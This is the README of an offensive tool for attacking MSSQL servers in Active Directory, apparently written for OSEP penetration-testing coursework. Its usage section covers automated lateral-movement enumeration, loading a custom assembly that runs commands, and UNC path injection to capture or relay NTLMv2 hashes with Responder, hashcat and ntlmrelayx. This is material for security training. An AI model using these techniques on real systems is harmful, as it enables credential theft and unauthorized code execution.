# MSSQL Active Directory Client
This project is intended to be a plug-and-play executable that performs everything outlined in the OSEP coursework for exploiting MSSQL in Active Directory


## Usage 
```
## Attempt to and automatically do enumeration for lateral movement ##
.\sql.exe *server name* *database*

## Manually provide the connection String
.\sql.exe --conn "Connection String" 

## Connect and begin an enter interactive session
.\sql.exe *server name* *database* -i
.\sql.exe --conn "Connection String" -i


## Interactive Mode options
!help
    Display interactive mode help menu

!assembly *dll file*
    Load in custom Assembly.
    Default Assembly Name: myAssembly
    Default Procedure Name: cmdExec
    Note: Your dll must use a class named 'SqlCmdExec' and contain a 'cmdExec' Method.

!deleteAssembly *Assembly Name* *Procedure Name*
    Drop Assembly and Procedure from SQL instance

!getHash *attacker ip/domain name*
    Attempt UNC Path Injection
    Be sure to run 'sudo responder -i *interface*' before running this.
    This should grant you a NTLMv2/Net-NTLM hash.
    This can be either be cracked with hashcat, or relayed with impacket-ntlmrelayx
```
